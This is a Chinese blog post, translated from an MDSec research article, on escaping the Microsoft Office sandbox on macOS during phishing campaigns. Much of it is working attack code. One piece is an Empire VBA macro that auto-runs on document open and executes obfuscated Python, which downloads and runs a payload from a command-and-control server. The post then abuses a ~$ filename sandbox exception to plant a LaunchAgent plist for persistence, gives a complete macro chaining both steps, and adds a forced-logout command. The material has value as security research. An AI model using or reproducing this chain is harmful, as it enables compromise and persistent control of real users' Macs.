<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="沙箱逃逸 - Microsoft Office在MacOS上的应用"><meta name="keywords" content="Web Security"><meta name="author" content="Ginove,undefined"><meta name="copyright" content="Ginove"><title>沙箱逃逸 - Microsoft Office在MacOS上的应用 | Ginove</title><link rel="shortcut icon" href="https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/%E8%B7%AF%E9%A3%9E/bitbug_favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"CH3QQ87I9H","apiKey":"1005940df08368eb06761af10c531247","indexName":"my-hexo-blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire框架"><span class="toc-number">1.</span> <span class="toc-text">Empire框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MacOS沙箱"><span class="toc-number">2.</span> <span class="toc-text">MacOS沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启动沙箱逃逸"><span class="toc-number">3.</span> <span class="toc-text">启动沙箱逃逸</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/%E8%B7%AF%E9%A3%9E/toui.jpg"></div><div class="author-info__name text-center">Ginove</div><div class="author-info__description text-center">Keep optimistic and Never give up</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">24</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">9</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://api.dujin.org/bing/1366.php)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Ginove</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/about">About</a></span></div><div id="post-info"><div id="post-title">沙箱逃逸 - Microsoft Office在MacOS上的应用</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-09</time><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/"></span></a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084740-a3f7064a-a412-1.png" alt="image.png"></p>
<p>当你完成了对目标的侦察，并发现你的目标正在使用MacOS……接下来该怎么办？随着MacOS在企业中的日益普及，我们发现，在典型的网络钓鱼行动中，仅有针对Microsoft Windows终端的payloads是不够的。</p>
<p>考虑到这一点，我想找到一种在网络钓鱼活动期间登陆MacOS系统的有效方法。在这个演练中，我将展示一种可能的方法，即通过利用MacOS上的Microsoft Office获得跳跃点，并提出一种逃逸MacOS沙盒方法 。<a id="more"></a></p>
<h3 id="Empire框架"><a href="#Empire框架" class="headerlink" title="Empire框架"></a>Empire框架</h3><p>Empire是一个功能强大的开源C2框架，最初的目的是通过利用PowerShell来控制Windows环境。现在，通过合并单独的Empyre项目，Empire成为了攻击MacOS终端的goto工具。从框架中搜索MacOS stagers，你可以看到经典的的二进制payloads，AppleScript和Office宏。</p>
<p>众所周知，攻击者经常使用宏payloads来定位Windows上的Microsoft Office用户。既然这是有效的，那我们在钓鱼过程中使用相同的技术来定位MacOS用户就是有意义的。在我开始使用MacOS Macro stager之前，我想了解一下这是如何运作的。由于该项目是开源的，我们可以查看Github上的stager的历史，而引起我注意的是在2018年3月1日，来自@ import-au的更新：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084740-a43025ce-a412-1.png" alt="image.png"></p>
<p>这个小修改实际上是改变了生成VBA payload的方式，以兼容更高版本的Office中的对语言所做的更改。简而言之，宏引用了libc.dylib的外部库，允许我们通过“popen”函数来执行系统命令。如果我们使用Empire生成一个stager，我们最终得到的东西看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Private Declare PtrSafe Function system Lib &quot;libc.dylib&quot; Alias &quot;popen&quot; (ByVal command As String, ByVal mode As String) As LongPtr</span><br><span class="line">Sub Auto_Open()</span><br><span class="line">&apos;MsgBox(&quot;Auto_Open()&quot;)</span><br><span class="line">Debugging</span><br><span class="line">End Sub</span><br><span class="line">Sub Document_Open()</span><br><span class="line">&apos;MsgBox(&quot;Document_Open()&quot;)</span><br><span class="line">Debugging</span><br><span class="line">End Sub</span><br><span class="line">Public Function Debugging() As Variant</span><br><span class="line">On Error Resume Next</span><br><span class="line">#If Mac Then</span><br><span class="line">Dim result As LongPtr</span><br><span class="line">Dim cmd As String</span><br><span class="line">cmd = &quot;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS&quot;</span><br><span class="line">cmd = cmd + &quot;4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy&quot;</span><br><span class="line">cmd = cmd + &quot;4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dH&quot;</span><br><span class="line">cmd = cmd + &quot;A6Ly8xMjcuMC4wLjE6ODA4MCc7dD0nL25ld3MucGhwJztyZX&quot;</span><br><span class="line">cmd = cmd + &quot;E9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF&quot;</span><br><span class="line">cmd = cmd + &quot;9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZW&quot;</span><br><span class="line">cmd = cmd + &quot;FkZXIoJ0Nvb2tpZScsInNlc3Npb249L0Y0V3BmZllPSnNXOG&quot;</span><br><span class="line">cmd = cmd + &quot;JuVGRWYVc5b3d1NGxFPSIpOwpwcm94eSA9IHVybGxpYjIuUH&quot;</span><br><span class="line">cmd = cmd + &quot;JveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW&quot;</span><br><span class="line">cmd = cmd + &quot;5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIoby&quot;</span><br><span class="line">cmd = cmd + &quot;k7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj&quot;</span><br><span class="line">cmd = cmd + &quot;1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJ0F0eihdKUVhbk&quot;</span><br><span class="line">cmd = cmd + &quot;9UajE5b2Jfa20zTWg+KzZ2TkxRfXMlJztTLGosb3V0PXJhbm&quot;</span><br><span class="line">cmd = cmd + &quot;dlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogIC&quot;</span><br><span class="line">cmd = cmd + &quot;Agaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNT&quot;</span><br><span class="line">cmd = cmd + &quot;YKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIG&quot;</span><br><span class="line">cmd = cmd + &quot;NoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPS&quot;</span><br><span class="line">cmd = cmd + &quot;hqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQ&quot;</span><br><span class="line">cmd = cmd + &quot;ogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV&quot;</span><br><span class="line">cmd = cmd + &quot;0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&quot;</span><br><span class="line">&apos;MsgBox(&quot;echo &quot;&quot;import sys,base64;exec(base64.b64decode(\&quot;&quot; &quot; &amp; cmd &amp; &quot; \&quot;&quot;));&quot;&quot; | /usr/bin/python &amp;&quot;)</span><br><span class="line">result = system(&quot;echo &quot;&quot;import sys,base64;exec(base64.b64decode(\&quot;&quot; &quot; &amp; cmd &amp; &quot; \&quot;&quot;));&quot;&quot; | /usr/bin/python &amp;&quot;, &quot;r&quot;)</span><br><span class="line">#End If</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>
<p>在初始化“Private Declare PtrSafe Function“（私有声明PtrSafe功能）调用中，会出现很多意想不到的情况。为了了解这个API级别的调用情况，让我们稍微修改一下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Private Declare PtrSafe Function system Lib &quot;libnope.dylib&quot; Alias &quot;doesntexist&quot; (ByVal command As String, ByVal mode As String) As LongPtr</span><br></pre></td></tr></table></figure></p>
<p>将调试器附加到正在运行的Word实例中，并在常见的动态链接器API函数上设置一些断点，我们执行宏并看到以下内容：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084740-a4575824-a412-1.png" alt="image.png"></p>
<p>所以，在这里可以看到我们请求的dylib实际上是通过调用“dlopen()”加载的。这告诉了我们两件事，第一，VBA的执行发生在“Microsoft Word”处理流程中，而不是另一个流程或服务。第二，VBA在宏执行期间所做的任何操作都将受到与Microsoft Word进程相同的限制。<br>现在我们已经了解发生了什么，那让我们使用上面的libc.dylib popen函数启动我们的Empire stager：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084740-a4692ae0-a412-1.png" alt="Picture"></p>
<p>这很简单……但是在和代理商进行交互之后，您也许会注意到事情并不是完全正确：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a47bb318-a412-1.png" alt="image.png"></p>
<p>因此，虽然我们可以在这种环境中进行操作，但条件变得极其严格。考虑到这一点，我决定看看发生了什么，看看我们是否可以做些事情来绕过这些限制。</p>
<h3 id="MacOS沙箱"><a href="#MacOS沙箱" class="headerlink" title="MacOS沙箱"></a>MacOS沙箱</h3><p>对于那些对MacOS运作有些了解的人，会发现上面显示的错误是MacOS沙盒限制应用程序的典型错误。如果我们列出我们的处理流程，我们会看到我们对Microsoft Word的猜想得到确认：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a48dd368-a412-1.png" alt="image.png"><br>知道了这一点，我们可以使用以下命令查看应用于Microsoft Word应用程序的沙箱规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codesign --display -v --entitlements - /Applications/Microsoft\ Word.app</span><br></pre></td></tr></table></figure></p>
<p>然后会很多请求的权利的显示，例如允许Microsoft Word访问用户选择的文件，充当网络客户端，访问地址簿等：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">com.apple.security.files.bookmarks.app-scope</span><br><span class="line">com.apple.security.files.user-selected.read-write</span><br><span class="line">com.apple.security.network.client</span><br><span class="line">com.apple.security.personal-information.addressbook</span><br><span class="line">com.apple.security.print</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>然后，当我们接近列表的末尾时，我看到一些有点奇怪的东西：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com.apple.security.temporary-exception.sbpl</span><br><span class="line">(allow file-read* file-write*</span><br><span class="line">(require-any</span><br><span class="line">(require-all (vnode-type REGULAR-FILE) (regex #&quot;(^|/)~\$[^/]+$&quot;))</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>这个规则允许Microsoft Word进程读取/写入文件，只要它与以下正则表达式匹配即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(^|/)~\$[^/]+$</span><br></pre></td></tr></table></figure></p>
<p>起初我无法理解为什么这个异常出会现在这儿，但是在制作与此正则表达式匹配的文件名时，它实际上开始有意义了，例如<code>~$document1.docx</code>。这是Office使用临时文件的典型文件名格式，因此，这个规则的作用是允许进程在不提示用户每次允许的情况下保存临时文件。<br>这种时候，警报铃应该发出警报，因为尽管这个规则允许Word创建临时文件，但它也允许我们在文件系统的任何位置创建文件，只要满足以<code>~$something</code>结尾即可。回到我们原来的沙箱Empire代理，并试试使用这种格式来创建一个文件，我们可以看到没有之前“不允许操作”的错误提示：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a4a0e084-a412-1.png" alt="image.png"></p>
<p>现在我们在沙箱的保护壳发现了一个缝隙，我们需要找到一种使用它来帮助我们逃离这个沙箱的方法，并获得一个不受限制的代理会话。</p>
<h3 id="启动沙箱逃逸"><a href="#启动沙箱逃逸" class="headerlink" title="启动沙箱逃逸"></a>启动沙箱逃逸</h3><p>MacOS的启动项本质上是初始化守护进程，其中附带了许多附加功能。您可以在以下目录中通过plist文件看到创建的大量服务（由<a href="http://www.launchd.info" target="_blank" rel="noopener">http://www.launchd.info</a> 提供）：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a4b9a678-a412-1.png" alt="image.png"></p>
<p>回到我们的目的，我们最感兴趣的是利用Word进程可以访问的路径，可能是~/Library/LaunchAgents。我们已经知道，我们可以在这个目录中创建匹配文件名的文件，但我们如何利用它来逃离沙箱？事实证明，当用户登录时，启动项会自动获取该目录中丢弃的所有plist。这意味着我们需要做的就是通过与沙箱正则表达式匹配的文件名制作出一个plist，然后等待用户登录…这样我们应该能够逃离Word沙箱。<br>考虑到这一点，让我们创建一个简单的工作，它将在启动时生成agent：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">&lt;key&gt;Label&lt;/key&gt;</span><br><span class="line">&lt;string&gt;com.xpnsec.escape&lt;/string&gt;</span><br><span class="line">&lt;key&gt;ProgramArguments&lt;/key&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;string&gt;python&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;import sys,base64,warnings;warnings.filterwarnings(&apos;ignore&apos;);exec(base64.b64decode(&apos;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODA4MCc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cWV1eW94SURrM1hzeTNGcW9adGlYV0h5U0FZPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJ0F0eihdKUVhbk9UajE5b2Jfa20zTWg+KzZ2TkxRfXMlJztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&apos;));&lt;/string&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;key&gt;RunAtLoad&lt;/key&gt;</span><br><span class="line">&lt;true/&gt;</span><br><span class="line">&lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里我就不做详细介绍了，但这个plist基本上要做的，就是当Empire stager被加载后启动python。<br>现在我们有了plist，我们需要做的就是等待用户注销并重新登录，最后我们收到的回应：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a4d3a618-a412-1.png" alt="image.png"></p>
<p>如果您有强迫症，想要强制用户注销，实际上，您也可以在沙盒环境中使用下面的方法来执行这个操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launchctl bootout gui/$UID</span><br></pre></td></tr></table></figure></p>
<p>有了它，我们就可以很好地绕过Mac沙箱上的Microsoft Office。当然，您可以将沙箱逃逸写到您的VBA中，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Private Declare PtrSafe Function system Lib &quot;libc.dylib&quot; Alias &quot;popen&quot; (ByVal command As String, ByVal mode As String) As LongPtr</span><br><span class="line">Private Sub Document_Open()</span><br><span class="line">Dim path As String</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;import sys,base64,warnings;warnings.filterwarnings(&apos;ignore&apos;);exec(base64.b64decode(&apos;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMj&quot; &amp; _</span><br><span class="line">&quot;sKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdl&quot; &amp; _</span><br><span class="line">&quot;Y2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODA4MCc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZ&quot; &amp; _</span><br><span class="line">&quot;XF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb&quot; &amp; _</span><br><span class="line">&quot;2tpZScsInNlc3Npb249cWV1eW94SURrM1hzeTNGcW9adGlYV0h5U0FZPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5k&quot; &amp; _</span><br><span class="line">&quot;bGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dX&quot; &amp; _</span><br><span class="line">&quot;JsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJ0F0eihdKUVhbk9UajE5b2&quot; &amp; _</span><br><span class="line">&quot;Jfa20zTWg+KzZ2TkxRfXMlJztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitT&quot; &amp; _</span><br><span class="line">&quot;W2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIg&quot; &amp; _</span><br><span class="line">&quot;aW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICA&quot; &amp; _</span><br><span class="line">&quot;gb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&apos;));&quot;</span><br><span class="line">path = Environ(&quot;HOME&quot;) &amp; &quot;/../../../../Library/LaunchAgents/~$com.xpnsec.plist&quot;</span><br><span class="line">arg = &quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot; encoding=&quot;&quot;UTF-8&quot;&quot;?&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;!DOCTYPE plist PUBLIC &quot;&quot;-//Apple//DTD PLIST 1.0//EN&quot;&quot; &quot;&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&quot;&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;plist version=&quot;&quot;1.0&quot;&quot;&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;dict&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;key&gt;Label&lt;/key&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;string&gt;com.xpnsec.sandbox&lt;/string&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;key&gt;ProgramArguments&lt;/key&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;array&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;string&gt;python&lt;/string&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;string&gt;-c&lt;/string&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;string&gt;&quot; &amp; payload &amp; &quot;&lt;/string&gt;&quot; &amp; _</span><br><span class="line">&quot;&lt;/array&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;key&gt;RunAtLoad&lt;/key&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;true/&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;/dict&gt;\n&quot; &amp; _</span><br><span class="line">&quot;&lt;/plist&gt;&quot;</span><br><span class="line">Result = system(&quot;echo &quot;&quot;&quot; &amp; arg &amp; &quot;&quot;&quot; &gt; &apos;&quot; &amp; path &amp; &quot;&apos;&quot;, &quot;r”)</span><br><span class="line">‘Make sure this doesn’t raise alarms as it will force the user to logoff</span><br><span class="line">&apos;Result = system(&quot;launchctl bootout gui/$UID”, “r&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
<p>我们发现此技术适用于支持宏功能的所有Microsoft Office for Mac 2016应用程序，因为每个应用程序共享相同的权利。例如，下面我们可以在Microsoft Excel中找到相同的规则：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180820084741-a4e538ce-a412-1.png" alt="image.png"></p>
<p>如果你能想出任何其他方法来利用这种技术实现沙箱逃逸，我们非常欢迎您的分享。<br>这篇文章和相关的研究由 MDSec的ActiveBreach团队的Adam Chester完成。</p>
<hr>
<p>本文翻译自：<a href="https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/</a></p>
<hr>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ginove</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ginove.github.io/2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/">https://ginove.github.io/2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ginove.github.io" target="_blank">Ginove</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-Security/">Web Security</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/09/09/OpenSSH用户枚举漏洞：一探究竟/"><i class="fa fa-chevron-left">  </i><span>OpenSSH用户枚举漏洞：一探究竟</span></a></div><div class="next-post pull-right"><a href="/2018/09/09/实战web缓存中毒/"><span>实战web缓存中毒</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'https://ginove.github.io/2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/';
  this.page.identifier = '2018/09/09/沙箱逃逸-Microsoft-Office在MacOS上的应用/';
  this.page.title = '沙箱逃逸 - Microsoft Office在MacOS上的应用';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'https-ginove-github-io' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-src" src="https://https-ginove-github-io.disqus.com/count.js" async></script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2018 By Ginove</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script 